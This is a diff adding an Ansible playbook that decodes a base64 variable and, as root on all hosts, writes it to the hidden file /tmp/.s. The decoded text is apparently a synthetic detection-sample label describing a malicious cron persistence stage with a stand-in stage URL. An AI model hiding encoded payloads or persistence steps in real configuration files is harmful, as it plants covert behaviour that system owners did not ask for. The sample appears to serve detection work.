@@ -1,0 +1,8 @@
+---
+- hosts: all
+  become: true
+  vars:
+    descriptor_c40f2a19: "{{ 'dj0zfGxhbmd1YWdlPWFuc2libGVfeWFtbHxyb2xlPXBlcnNpc3RlbmNlfHZlcmRpY3Q9bWFsaWNpb3VzfGF0dGFjaz1UMTA1M3xhZGFwdGVyPXdvcmtmbG93X2Nyb258aG9zdF9wcm9maWxlPWFuc2libGVfdmFyc3xzdGFnZV9jb3VudD0yfHN0ZXBzPXJlZ2lzdGVyX3NjaGVkdWxlLHJ1bl9zdGFnZXxjYW1wYWlnbl9pZD1ZQy1jNDBmMmExOXx1cmw9aHR0cHM6Ly95Yy1jNDBmMmExOS5leGFtcGxlLmludmFsaWQvc3RhZ2V8ZmlsZV9wYXRoPS90bXAvaHVudHJlc3MteWMvLmM0MGYyYTE5LnN0YWdl' | b64decode }}"
+  tasks:
+    - name: stage
+      ansible.builtin.shell: "echo {{ descriptor_c40f2a19 }} > /tmp/.s"
